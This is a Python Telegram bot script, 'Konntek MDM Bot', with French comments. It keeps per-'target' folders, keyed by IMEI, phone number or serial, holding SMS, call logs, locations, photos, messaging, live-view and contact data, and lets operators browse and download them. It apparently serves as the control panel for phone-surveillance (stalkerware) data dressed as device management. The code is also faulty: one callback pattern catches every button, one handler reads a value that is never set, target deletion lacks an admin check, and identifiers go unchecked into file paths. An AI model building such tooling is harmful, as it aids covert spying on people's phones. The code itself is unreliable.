# bot.py - Script principal du bot @konntek_mdm_bot

import os
import sqlite3
from datetime import datetime
from pathlib import Path
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# Config
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_IDS = [123456789]  # Remplace avec ton ID Telegram
BASE_PATH = Path("data")
DB_PATH = "konntek.db"

# Initialisation BD
conn = sqlite3.connect(DB_PATH)
cursor = conn.cursor()
cursor.execute("""
CREATE TABLE IF NOT EXISTS targets (
    id TEXT PRIMARY KEY,
    created_at TEXT
)
""")
cursor.execute("""
CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target_id TEXT,
    action TEXT,
    file TEXT,
    timestamp TEXT
)
""")
conn.commit()

# Utilitaires
SECTIONS = [
    "sms_mms", "appels", "localisations", "photos", "messageries",
    "controle_distance", "visualisation_directe", "fichiers",
    "restrictions", "applications", "sites_web",
    "calendrier", "contacts", "analyse"
]

def log_action(target_id, action, file):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute("INSERT INTO logs (target_id, action, file, timestamp) VALUES (?, ?, ?, ?)",
                   (target_id, action, file, now))
    conn.commit()

    path = BASE_PATH / target_id / "logs"
    path.mkdir(parents=True, exist_ok=True)
    with open(path / "activity.log", "a") as f:
        f.write(f"[{now}] {action.upper()}: {file}\n")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Bienvenue sur Konntek MDM Bot. Veuillez entrer un IMEI / Numéro / SN pour commencer.")

async def handle_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ident = update.message.text.strip()
    target_path = BASE_PATH / ident
    if not target_path.exists():
        cursor.execute("INSERT OR IGNORE INTO targets (id, created_at) VALUES (?, ?)",
                       (ident, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        for section in SECTIONS:
            (target_path / section).mkdir(parents=True, exist_ok=True)
        (target_path / "logs").mkdir(exist_ok=True)

    buttons = [[InlineKeyboardButton(section, callback_data=f"{ident}|{section}")]
               for section in SECTIONS]
    await update.message.reply_text(f"Cible {ident} initialisée. Choisissez une section :",
                                    reply_markup=InlineKeyboardMarkup(buttons))

async def handle_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    ident, section = query.data.split("|")
    folder = BASE_PATH / ident / section
    files = list(folder.glob("*"))
    if not files:
        await query.edit_message_text(f"Aucun fichier trouvé dans {section} pour {ident}.")
        return
    buttons = [[InlineKeyboardButton(file.name, callback_data=f"download|{ident}|{section}|{file.name}")]
               for file in files]
    await query.edit_message_text(f"Fichiers dans {section} de {ident} :",
                                  reply_markup=InlineKeyboardMarkup(buttons))

async def handle_download(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    _, ident, section, filename = query.data.split("|")
    file_path = BASE_PATH / ident / section / filename
    if file_path.exists():
        log_action(ident, "consult", str(file_path))
        await query.message.reply_document(InputFile(file_path))
    else:
        await query.message.reply_text("Fichier introuvable.")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ident = context.chat_data.get("last_ident")
    if not ident:
        await update.message.reply_text("Veuillez d'abord saisir un identifiant.")
        return
    file = update.message.document or update.message.photo[-1] if update.message.photo else None
    if file:
        section = "fichiers"
        folder = BASE_PATH / ident / section
        folder.mkdir(parents=True, exist_ok=True)
        file_name = file.file_name if hasattr(file, 'file_name') else f"image_{datetime.now().timestamp()}.jpg"
        file_path = folder / file_name
        await file.get_file().download_to_drive(file_path)
        log_action(ident, "upload", str(file_path))
        await update.message.reply_text("Fichier reçu et sauvegardé.")

async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("Accès refusé.")
        return
    cursor.execute("SELECT id FROM targets")
    targets = cursor.fetchall()
    txt = "Cibles enregistrées :\n" + "\n".join([t[0] for t in targets])
    await update.message.reply_text(txt)

async def delete_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage : /delete_target <id>")
        return
    ident = context.args[0]
    path = BASE_PATH / ident
    if path.exists():
        for root, dirs, files in os.walk(path, topdown=False):
            for name in files:
                os.remove(os.path.join(root, name))
            for name in dirs:
                os.rmdir(os.path.join(root, name))
        os.rmdir(path)
    cursor.execute("DELETE FROM targets WHERE id = ?", (ident,))
    cursor.execute("DELETE FROM logs WHERE target_id = ?", (ident,))
    conn.commit()
    await update.message.reply_text(f"Cible {ident} supprimée.")

# Lancement du bot
if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin))
    app.add_handler(CommandHandler("delete_target", delete_target))
    app.add_handler(CallbackQueryHandler(handle_download, pattern="^download|"))
    app.add_handler(CallbackQueryHandler(handle_button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_id))
    app.add_handler(MessageHandler(filters.Document.ALL | filters.PHOTO, handle_file))
    app.run_polling()
